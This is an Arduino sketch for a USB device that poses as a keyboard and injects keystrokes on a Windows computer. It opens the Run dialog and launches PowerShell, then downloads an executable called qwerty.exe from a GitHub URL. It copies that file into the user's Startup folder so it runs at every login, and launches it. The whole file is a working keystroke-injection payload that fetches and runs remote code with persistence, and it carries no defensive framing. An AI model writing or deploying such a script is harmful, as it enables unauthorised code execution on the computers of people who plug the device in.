#include <HIDKeyboard.h>

HIDKeyboard keyboard;

#define ENTER 0x28
#define GUI   0x08
#define KEY_R 0x15

void setup() {
  keyboard.begin();
  delay(1500);  // Let USB settle

  // Step 1: Win + R
  keyboard.pressKey(GUI, KEY_R);
  delay(100);
  keyboard.releaseKey();

  delay(2000);  // Wait for Run dialog to appear

  // Step 2: Type "powershell" and press Enter
  keyboard.println((char*)"powershell");

  // ✅ Step 3: Wait for PowerShell window to launch
  delay(3500);

  // ✅ Step 4: Run PowerShell commands
  keyboard.println((char*)"Invoke-WebRequest -Uri https://github.com/vaibhavpatil2734/QWERTY/raw/main/qwerty.exe -OutFile $env:USERPROFILE\\Downloads\\qwerty.exe");
  delay(5000);

  keyboard.println((char*)"Copy-Item $env:USERPROFILE\\Downloads\\qwerty.exe -Destination $env:APPDATA\\Microsoft\\Windows\\Start\\Menu\\Programs\\Startup\\qwerty.exe");
  delay(3000);

  keyboard.println((char*)"$env:APPDATA\\Microsoft\\Windows\\Start\\Menu\\Programs\\Startup\\qwerty.exe");
  delay(2000);

  keyboard.println((char*)"exit");

  // Done
  while (true);
}

void loop() {
  // Nothing here
}
